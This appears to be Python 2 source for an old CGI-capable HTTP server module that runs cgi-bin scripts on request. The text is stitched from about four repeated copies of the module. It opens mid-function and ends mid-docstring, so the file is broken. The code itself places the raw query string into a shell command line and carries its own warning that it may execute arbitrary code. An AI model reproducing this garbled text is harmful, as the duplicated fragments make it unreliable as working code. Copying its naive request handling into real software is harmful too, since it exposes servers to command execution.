                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
"""


__version__ = "0.4"

__all__ = ["CGIHTTPRequestHandler"]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """Serve a POST request.

        This is only implemented for CGI scripts.

        """

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, "Can only POST to CGI scripts")

    def send_head(self):
        """Version of send_head that support CGI scripts"""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """Test whether self.path corresponds to a CGI script,                    
        and return a boolean.                    

        This function sets self.cgi_info to a tuple (dir, rest)                    
        when it returns True, where dir is the directory part before                    
        the CGI script name.  Note that rest begins with a                    
        slash if it is not empty.                    

        The default implementation tests whether the path                    
        begins with one of the strings in the list                    
        self.cgi_directories (and the next character is a '/'                    
        or the end of the string).                    
        """

        path = self.path                    

        for x in self.cgi_directories:                    
            i = len(x)                    
            if path[:i] == x and (not path[i:] or path[i] == '/'):                    
                self.cgi_info = path[:i], path[i+1:]                    
                return True                    
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """Test whether argument path is an executable file."""
        return executable(path)

    def is_python(self, path):
        """Test whether argument path is a Python script."""
        head, tail = os.path.splitext(path)
        return tail.lower() in (".py", ".pyw")

    def run_cgi(self):
        """Execute a CGI script."""
        path = self.path                    
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, "No such CGI script (%r)" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, "CGI script is not a plain file (%r)" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, "CGI script is not a Python script (%r)" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, "CGI script is not executable (%r)" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader("authorization")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == "basic":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in "\t\n\r ":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, "")
        os.environ.update(env)

        self.send_response(200, "Script output follows")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error("CGI script exit status %#x", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith("w.exe"):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = "%s -u %s" % (interp, cmdline)
            if '=' not in query and '"' not in query:
                cmdline = '%s "%s"' % (cmdline, query)
            self.log_message("command: %s", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == "post" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error("CGI script exit status %#x", sts)
            else:
                self.log_message("CGI script exited OK")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {"__name__": "__main__"})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error("CGI script exit status %s", str(sts))
            else:
                self.log_message("CGI script exited OK")


nobody = None

def nobody_uid():
    """Internal routine to get nobody's uid"""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """Test for executable file."""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()

"""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

